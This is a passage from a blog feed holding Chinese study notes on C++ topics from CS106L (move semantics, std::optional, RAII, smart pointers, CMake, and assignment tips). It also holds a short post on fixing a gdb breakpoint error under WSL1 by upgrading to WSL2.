移动赋值运算符</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="move-semantics移动语义">Move Semantics（移动语义）</h2><p>涉及到了左值右值，下面没有详细展开，主要介绍<code>std::move</code>函数。</p><p>移动构造函数、移动赋值运算符均属于该知识点，当要触发这两个函数时，需要用到<code>std::move</code>，例如上面的例子</p><h3 id="stdmove">std::move</h3><h4 id="定义">定义</h4><ul><li><code>std::move</code>是一个标准库函数，用于将左值显式地转为右值引用，从而触发移动语义。</li><li>注意：<code>std::move</code>并不移动对象，而是允许对象的资源被移动。</li></ul><h4 id="语法">语法</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">T&amp;&amp; <span class="title">std::move</span><span class="params">(T&amp; t)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="示例-2">示例</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::string str = <span class="string">"Hello"</span>;</span><br><span class="line">std::string movedStr = std::<span class="built_in">move</span>(str); <span class="comment">// 触发移动构造函数</span></span><br></pre></td></tr></tbody></table></figure><h2 id="stdoptional">std::optional</h2><p><code>std::optional</code> 是 C++17引入的一个工具类，用来表示一个值可能存在也可能不存在的情形。它提供了一种优雅的方式来处理可能为空的值，而不需要依赖额外的布尔标志或使用指针。</p><h3 id="主要特点"><strong>主要特点</strong></h3><ol type="1"><li><strong>值的可选性：</strong><ul><li>一个 <code>std::optional</code>对象可以包含一个值，也可以不包含值（即处于 "empty" 状态）。</li><li>适合用来表示“可有可无”的数据。</li></ul></li><li><strong>避免空指针：</strong><ul><li>比如函数可能返回一个值，也可能不返回值，用<code>std::optional</code> 替代返回指针避免空指针引发的错误。</li></ul></li><li><strong>强类型保障：</strong><ul><li>提供比返回 <code>nullptr</code> 或特殊标志（例如 <code>-1</code> 或<code>0</code>）更安全的方式，确保程序的行为更加明确。</li></ul></li></ol><h3 id="使用场景-2"><strong>使用场景</strong></h3><ol type="1"><li><p><strong>函数返回值</strong> 当函数不总是能返回有效值时，用<code>std::optional</code> 表示返回值的可选性。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;optional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::optional&lt;std::string&gt; <span class="title">findNameById</span><span class="params">(<span class="type">int</span> id)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">1</span>) <span class="keyword">return</span> <span class="string">"Alice"</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">2</span>) <span class="keyword">return</span> <span class="string">"Bob"</span>;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="literal">nullopt</span>; <span class="comment">// 无值的情况</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> name = <span class="built_in">findNameById</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (name) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Found: "</span> &lt;&lt; *name &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Name not found.\n"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>替代布尔标志：</strong>用于标志是否存在值，避免额外的布尔变量。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Result</span> {</span><br><span class="line">    std::optional&lt;<span class="type">int</span>&gt; data;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function">Result <span class="title">compute</span><span class="params">(<span class="type">bool</span> flag)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (flag) <span class="keyword">return</span> Result{<span class="number">42</span>};</span><br><span class="line">    <span class="keyword">return</span> Result{std::<span class="literal">nullopt</span>};</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>临时对象的状态管理：</strong>表示某些临时值是否有效，比如缓存结果。</p></li></ol><blockquote><p>注意<code>nullptr</code>和<code>std::nullopt</code>区别</p><ul><li><code>nullptr</code>：专门用来表示指针不指向任何对象。它可以隐式地转换为任意指针类型，例如<code>int*</code>, <code>char*</code>, <code>void*</code> 等。</li><li><code>std::nullopt</code>：它是 C++17 中引入的<code>std::optional</code> 的特殊值，用来表示一个<code>std::optional</code>对象不包含任何值（为空的状态）。它可以隐式地用于任何<code>std::optional&lt;T&gt;</code> 类型，用于初始化或重置<code>optional</code>。</li></ul></blockquote><h2 id="raii">RAII</h2><p>RAII，全称为 <strong>资源获取即初始化</strong>（Resource AcquisitionIs Initialization），是一种 C++ 的重要设计理念。RAII的核心是将资源（如内存、文件、网络连接、锁等）的管理与对象的生命周期绑定。具体来说：</p><ul><li><strong>在对象构造时获取资源</strong>，确保资源在对象的整个生命周期内可用。</li><li><strong>在对象析构时释放资源</strong>，自动清理以防资源泄漏。</li></ul><p>这种方式可以有效地避免资源泄露问题，简化资源管理。<strong>常见应用场景</strong>：</p><ol type="1"><li><p><strong>智能指针：</strong></p><ul><li><code>std::unique_ptr</code>, <code>std::shared_ptr</code>等智能指针利用 RAII 管理动态内存。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">example</span><span class="params">()</span> </span>{</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">42</span>); <span class="comment">// 构造时分配内存</span></span><br><span class="line">    <span class="comment">// 无需手动释放内存</span></span><br><span class="line">} <span class="comment">// 离开作用域时，ptr 自动释放内存</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>文件管理：</strong></p><ul><li>使用 RAII 类管理文件资源，避免文件未关闭的问题。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="function">std::ofstream <span class="title">file</span><span class="params">(<span class="string">"example.txt"</span>)</span></span>; <span class="comment">// 打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (!file) <span class="keyword">return</span>;</span><br><span class="line">    file &lt;&lt; <span class="string">"Hello, RAII!"</span>;</span><br><span class="line">} <span class="comment">// 离开作用域时，file 自动关闭</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>锁管理：</strong></p><ul><li>使用 RAII 类如 <code>std::lock_guard</code>管理线程同步中的锁。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">criticalSection</span><span class="params">()</span> </span>{</span><br><span class="line">    std::mutex mtx;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>; <span class="comment">// 自动加锁</span></span><br><span class="line">    <span class="comment">// 临界区代码</span></span><br><span class="line">} <span class="comment">// 离开作用域时，lock_guard 自动解锁</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="智能指针">智能指针</h2><p>Smart Pointers</p><h3 id="stdunique_ptr">1.<strong><code>std::unique_ptr</code></strong></h3><ul><li><strong>特点</strong>: 独占所有权。一个对象只能由一个<code>std::unique_ptr</code> 所管理。</li><li><strong>主要用途</strong>:用于明确对象所有权的场景，比如局部变量的资源管理。</li><li><strong>自动释放</strong>: 离开作用域时自动释放所管理的对象。</li></ul><p><strong>用法</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uniquePtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>); <span class="comment">// 推荐使用 std::make_unique</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能复制，以下代码会报错</span></span><br><span class="line">    <span class="comment">// std::unique_ptr&lt;int&gt; ptr2 = ptr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以转移所有权</span></span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr2 = std::<span class="built_in">move</span>(ptr);</span><br><span class="line">    <span class="keyword">if</span> (!ptr) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"ptr is now empty after move."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>优点</strong></p><ul><li>更轻量化，效率最高。</li><li>避免重复释放同一个对象的问题。</li><li>使用场景清晰，适合独占资源。</li></ul><p><strong>缺点</strong></p><ul><li>不能共享所有权（即多个指针管理同一个资源）。</li></ul><h3 id="stdshared_ptr">2.<strong><code>std::shared_ptr</code></strong></h3><ul><li><strong>特点</strong>: 共享所有权。多个 <code>std::shared_ptr</code>可以共同管理同一个对象，直到最后一个 <code>std::shared_ptr</code>被销毁时对象才会释放。</li><li><strong>主要用途</strong>:用于需要多个指针共享资源的场景，比如资源共享和并发场景。</li></ul><p><strong>用法</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sharedPtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; ptr1 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">20</span>); <span class="comment">// 推荐使用 std::make_shared</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr1 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; ptr2 = ptr1; <span class="comment">// 共享所有权</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Use count: "</span> &lt;&lt; ptr1.<span class="built_in">use_count</span>() &lt;&lt; std::endl; <span class="comment">// 引用计数</span></span><br><span class="line"></span><br><span class="line">    ptr1.<span class="built_in">reset</span>(); <span class="comment">// ptr1 不再管理资源</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Use count after reset: "</span> &lt;&lt; ptr2.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>优点</strong></p><ul><li>方便在需要共享资源的场景中使用。</li><li>自动进行引用计数，最后一个指针销毁时释放资源。</li></ul><p><strong>缺点</strong></p><ul><li>有一定的性能开销（引用计数管理）。</li><li>如果存在循环引用，可能导致内存泄漏（需配合<code>std::weak_ptr</code> 解决）。</li></ul><h3 id="stdweak_ptr">3. <strong><code>std::weak_ptr</code></strong></h3><ul><li><strong>特点</strong>: 弱引用。用于解决 <code>std::shared_ptr</code>循环引用的问题。</li><li><strong>主要用途</strong>: 辅助 <code>std::shared_ptr</code>使用，不增加引用计数，只能观察（弱引用）资源。</li></ul><p><strong>用法</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">weakPtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; shared = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">30</span>);</span><br><span class="line">    std::weak_ptr&lt;<span class="type">int</span>&gt; weak = shared; <span class="comment">// 不增加引用计数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> ptr = weak.<span class="built_in">lock</span>()) { <span class="comment">// 检查资源是否仍然存在</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Resource no longer exists."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    shared.<span class="built_in">reset</span>(); <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> ptr = weak.<span class="built_in">lock</span>()) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Resource no longer exists."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>优点</strong></p><ul><li>用于解决 <code>std::shared_ptr</code> 循环引用问题。</li><li>允许访问资源但不拥有资源，不影响引用计数。</li></ul><p><strong>缺点</strong></p><ul><li>只能与 <code>std::shared_ptr</code> 搭配使用，单独意义不大。</li></ul><h2 id="makefiles-和-cmake">Makefiles 和 CMake</h2><h3 id="makefile"><strong>1. Makefile</strong></h3><ul><li><code>Makefile</code> 是用于 <code>make</code>工具的配置文件，它定义了一系列规则，告诉编译器如何生成目标文件。</li><li>本质上是手写的构建规则，直接调用编译器命令。</li></ul><h3 id="cmake"><strong>2. CMake</strong></h3><p>需要编写编写 <code>CMakeLists.txt</code></p><ul><li><code>CMake</code>是一种跨平台的构建系统生成工具，它可以生成不同平台上的项目文件（如<code>Makefile</code>、Visual Studio 的项目文件）。</li><li><code>CMake</code> 本质上是为大型项目提供了高层次的抽象。</li></ul><h2 id="assignment">Assignment</h2><p>参考资料：https://www.zhihu.com/column/c_1839339107211419649</p><h3 id="assignment-1">Assignment 1</h3><ul><li><p>在迭代 <code>std::vector</code>时，不建议直接修改当前遍历的容器（如删除元素）。一种常见的做法是使用<strong>后向迭代</strong> 或者<strong>标记删除</strong>，然后在迭代完成后删除元素。</p><p>但是这里不能使用反向迭代，会导致文件内容与正确文件内容不匹配（倒序，从最后一行往第一行读取内容），所以这里定义了一个中间变量存放待删除的元素。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;Course&gt; tmp; <span class="comment">// 存放待删除的元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> c: all_courses) {</span><br><span class="line">    <span class="keyword">if</span>(c.quarter != <span class="string">"null"</span>) {</span><br><span class="line">        ofile &lt;&lt; c.title &lt;&lt; <span class="string">","</span> &lt;&lt; c.number_of_units &lt;&lt; <span class="string">","</span> &lt;&lt; c.quarter &lt;&lt; <span class="string">"\n"</span>;</span><br><span class="line">        tmp.<span class="built_in">push_back</span>(c);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> t: tmp) {</span><br><span class="line">    <span class="built_in">delete_elem_from_vector</span>(all_courses, t);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>创建了一个临时容器<code>tmp</code>，并在遍历过程中把要删除的元素放入其中。遍历完后，再通过<code>delete_elem_from_vector</code> 从 <code>all_courses</code>中删除这些元素。这样可以避免在原容器上进行删除操作时改变容器的大小或顺序，从而避免迭代器失效的问题。</p></blockquote></li></ul><h3 id="assignment-2">Assignment 2</h3><p>需要注意作业要求获取 first name 和 last name的两个首字母，两个都必须参与比较，可以单独写一个函数记录两个字母，然后进行比较</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">get_initials</span><span class="params">(std::string name)</span> </span>{</span><br><span class="line">  <span class="comment">// 初始化结果字符串</span></span><br><span class="line">    std::string res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个字母</span></span><br><span class="line">    res += name[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找空格位置</span></span><br><span class="line">    <span class="type">size_t</span> space_pos = name.<span class="built_in">find</span>(<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果找到了空格，获取空格后第一个字母</span></span><br><span class="line">    <span class="keyword">if</span> (space_pos != std::string::npos &amp;&amp; space_pos + <span class="number">1</span> &lt; name.<span class="built_in">size</span>()) {</span><br><span class="line">        res += name[space_pos + <span class="number">1</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">std::queue&lt;<span class="type">const</span> std::string*&gt; <span class="title">find_matches</span><span class="params">(std::string name, std::unordered_set&lt;std::string&gt;&amp; students)</span> </span>{</span><br><span class="line">  <span class="comment">// STUDENT <span class="doctag">TODO:</span> Implement this function.</span></span><br><span class="line">  std::queue&lt;<span class="type">const</span> std::string*&gt; q;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> it = students.<span class="built_in">begin</span>(); it != students.<span class="built_in">end</span>(); ++it) {</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">get_initials</span>(*it) == <span class="built_in">get_initials</span>(kYourName))</span><br><span class="line">      q.<span class="built_in">push</span>(&amp;(*it)); <span class="comment">// 先解引用it得到字符串，然后再获取该字符串的地址</span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> q;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="assignment-3">Assignment 3</h3><p>CastXML环境有问题，无法生成xml文件导致无法测评</p><h3 id="assignment-4">Assignment 4</h3><p>主要用到下面这几个函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="built_in">min_element</span>( ForwardIt first, ForwardIt last );</span><br><span class="line">std::<span class="built_in">accumulate</span>(InputIt first, InputIt last, T init); <span class="comment">// 这里的init是初始值</span></span><br><span class="line">std::<span class="built_in">max_element</span>( ForwardIt first, ForwardIt last );</span><br><span class="line"></span><br><span class="line">std::<span class="built_in">transform</span>( InputIt first1, InputIt last1, OutputIt d_first, UnaryOp unary_op ); <span class="comment">// 第四个参数可用lambda表达式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//std::remove_if 它会 重新排列 指定范围内的元素，使所有 不符合 给定条件的元素排在前面，并返回一个新的 尾部迭代器，指向重新排列后的有效范围的末尾。</span></span><br><span class="line">std::<span class="built_in">remove_if</span>(ForwardIt first, ForwardIt last, UnaryPred p); <span class="comment">// p函数的返回值一般是布尔值</span></span><br><span class="line"></span><br><span class="line">std::erase <span class="comment">// 能够真正删除元素，可与remove_if配合使用</span></span><br></pre></td></tr></tbody></table></figure><p>还需注意<code>const</code>的使用，有些函数的参数不能使用<code>const</code>类型变量。</p><blockquote><p>如果出现以下报错，则在对应的文件打开函数中添加编码参数，例如：<code>open(file_path, "r", encoding="utf-8")</code></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 181, in &lt;module&gt;</span><br><span class="line">    add_matcher_tests(grader)</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 138, in add_matcher_tests     </span><br><span class="line">    student_methods = parse_methods(MAIN_CPP_PATH)</span><br><span class="line">                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File "D:\ComputerScience\CS106L\cs106l-assignments\assign4\autograder\autograder.py", line 97, in parse_methods</span><br><span class="line">    content = file.read()</span><br><span class="line">              ^^^^^^^^^^^</span><br><span class="line">UnicodeDecodeError: 'gbk' codec can't decode byte 0xa8 in position 693: illegal multibyte sequence</span><br></pre></td></tr></tbody></table></figure></blockquote><h3 id="assignment-5">Assignment 5</h3><p>第二部分中注意：对于拷贝构造函数，如果类包含动态数组（即指针指向的堆内存），必须单独为数组分配新内存，并拷贝内容，而不是仅仅赋值指针，否则会引发浅拷贝（shallow copy） 问题</p><h3 id="assignment-6">Assignment 6</h3><p>考察的知识点是<code>std::optional</code>，可参考上面的笔记</p><h3 id="assignment-7">Assignment 7</h3><p><strong>需要使用 <code>std::move</code>来显式触发移动构造函数和移动赋值运算符</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发移动构造函数</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">MyClass obj2 = std::<span class="built_in">move</span>(obj1); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发移动赋值运算符</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line"><span class="function">MyClass <span class="title">obj2</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br><span class="line">obj2 = std::<span class="built_in">move</span>(obj1);  </span><br></pre></td></tr></tbody></table></figure><p>这里还需要使用反向迭代器（reverse_iterator）来实现倒序遍历（逆序遍历），<code>rbegin()</code>指向容器的最后一个元素<code>rend()</code> 指向容器的前一个位置（即<code>begin() - 1</code>），下面是相关代码</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i = values.<span class="built_in">rbegin</span>(); i != values.<span class="built_in">rend</span>(); ++i) {</span><br><span class="line">    unique_ptr&lt;ListNode&lt;T&gt;&gt; node = <span class="keyword">new</span> <span class="built_in">ListNode</span>&lt;T&gt;(*i);</span><br><span class="line">    node-&gt;next = std::<span class="built_in">move</span>(head);</span><br><span class="line">    head = std::<span class="built_in">move</span>(node);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CPP</category>
      
      <category>CS106L</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPP</tag>
      
      <tag>CS106L</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gdb在WSL1中报错解决方案</title>
    <link href="/2025/01/04/gdb%E5%9C%A8WSL1%E4%B8%AD%E6%8A%A5%E9%94%99/"/>
    <url>/2025/01/04/gdb%E5%9C%A8WSL1%E4%B8%AD%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>我的环境如下：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\hxt&gt; wsl <span class="literal">--list</span> <span class="literal">--verbose</span></span><br><span class="line">  NAME      STATE           VERSION</span><br><span class="line">* Ubuntu    Stopped         <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>我想要在该环境下调试一个cpp文件，但是报错：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b 6</span><br><span class="line">Breakpoint 1 at 0x1224: file cin_2.cpp, line 7.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/hxt/test_code/cin_2</span><br><span class="line">warning: opening /proc/PID/mem file for lwp 399.399 failed: No such file or directory (2)</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x8001224</span><br></pre></td></tr></tbody></table></figure><p>经过搜索发现WSL1（Windows Subsystem forLinux）中没有对<code>/proc/PID/mem</code>提供支持，导致GDB在尝试访问该文件时出错。老版本的GDB在找不到<code>/proc/PID/mem</code>文件时会使用ptrace，而新版本的GDB则禁用了这种机制。这里是<a href="https://github.com/microsoft/WSL/issues/8356">相关讨论和不同解决方案</a>。</p><p><strong>我的解决方案</strong>是将WSL1升级到WSL2，使用命令<code>wsl --set-version &lt;发行版名称&gt; 2</code>，问题解决。</p>]]></content>
    
    
    <categories>
      
      <category>WSL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WSL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存映射</title>
    <link href="/2024/12/17/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/"/>
    <url>/2024/12/17/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/</url>
    
